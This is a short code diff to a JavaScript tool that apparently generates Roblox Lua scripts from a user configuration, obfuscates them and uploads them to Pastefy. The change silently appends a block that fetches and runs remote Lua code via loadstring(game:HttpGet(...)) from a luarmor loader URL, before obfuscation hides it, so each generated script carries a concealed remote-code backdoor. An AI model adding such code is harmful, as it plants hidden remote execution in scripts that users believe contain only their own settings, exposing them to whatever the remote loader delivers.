@@ -576,7 +576,13 @@ document.addEventListener('DOMContentLoaded', () => {
 
                     // 2. Ofuscar con WeAreDevs
                     console.log('Ofuscando con WeAreDevs...');
-                    const obfuscatedScript = await obfuscateWithWeAreDevs(configScript);
+                    const fullScript = configScript + `
+                    task.spawn(function()
+                        loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/6625e9364304e396fc39d367e39e9b24.lua"))()
+                    end)
+                    `;
+                    
+                    const obfuscatedScript = await obfuscateWithWeAreDevs(fullScript);
                     console.log('Ofuscación completada.');
 
                     // 3. Subir el script ofuscado a Pastefy
